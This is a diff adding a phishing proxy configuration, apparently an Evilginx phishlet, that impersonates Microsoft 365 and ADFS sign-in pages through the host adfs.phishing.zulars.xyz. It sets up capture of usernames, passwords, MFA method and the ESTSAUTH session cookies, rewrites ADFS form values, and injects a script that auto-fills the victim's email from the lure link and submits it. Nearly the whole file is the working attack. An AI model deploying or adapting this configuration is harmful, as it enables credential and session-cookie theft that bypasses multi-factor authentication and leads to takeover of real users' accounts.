@@ -1,0 +1,114 @@
+name: 'Microsoft 365 with ADFS Bypass'
+
+min_ver: '3.1.0'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login-microsoft', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login-live', orig_sub: 'login', domain: 'live.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www365', orig_sub: 'www', domain: 'microsoft365.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'adfs.phishing.zulars.xyz', session: true, is_landing: true}
+
+
+sub_filters:
+
+  - {triggers_on: 'adfs.adfs.phishing.zulars.xyz', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'adfs.adfs.phishing.zulars.xyz', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+auth_tokens:
+
+  - domain: '.login.microsoftonline.com'
+
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+
+    type: 'cookie'
+
+credentials:
+
+  username:
+
+    key: '(login|UserName)'
+
+    search: '(.*)'
+
+    type: 'post'
+
+  password:
+
+    key: '(passwd|Password|accesspass)'
+
+    search: '(.*)'
+
+    type: 'post'
+
+  custom:
+
+    - key: 'mfaAuthMethod'
+
+      search: '(.*)'
+
+      type: 'post'
+
+login:
+
+  domain: 'login.microsoftonline.com'
+
+  path: '/'
+
+force_post:
+
+  - path: '/login.srf'
+
+    search:
+
+      - {key: 'wa', search: '.*'}
+
+      - {key: 'wresult', search: '.*'}
+
+      - {key: 'wctx', search: '.*'}
+
+    force:
+       - {key: 'wresult', search: 'http\:\/\/adfs\.phishing\.zulars\.xyz\:443', value: 'http://adfs.phishing.zulars.xyz'}
+    type: 'post'
+
+# Auto fill email. Use by putting #{email} to the link e.g. https://L08.com/lures#l0111@gmail.com
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
+    trigger_paths: ["/common/oauth2/v2.0/authorize*", "/", "/*"]
+    script: |
+      function lp(){
+        var emailId = document.querySelector("#i0116");
+        var nextButton = document.querySelector("#idSIButton9");
+        var query = window.location.href;
+        if (/#/.test(window.location.href)){
+        var res = query.split("#");
+        var data1 = res[0];
+        var data2 = res[1];
+        console.log(data1);
+        console.log(data2);
+        if (emailId != null) {
+        var decodedString = data2;
+        if (/^[A-Za-z0-9+/=]+$/.test(data2)) { // check if string is base64 encoded
+        try {
+          decodedString = window.atob(data2.replace(/[=]/gi, ''));
+        } catch (e) {
+          console.error('Error decoding base64 string:', e);
+        }
+      }
+      emailId.focus();
+      emailId.value = decodedString;
+      nextButton.focus();
+      nextButton.click();
+      console.log("YES!");
+      return;
+            }
+        }
+         setTimeout(function(){lp();}, 500);
+        }
+        setTimeout(function(){lp();}, 500);
+
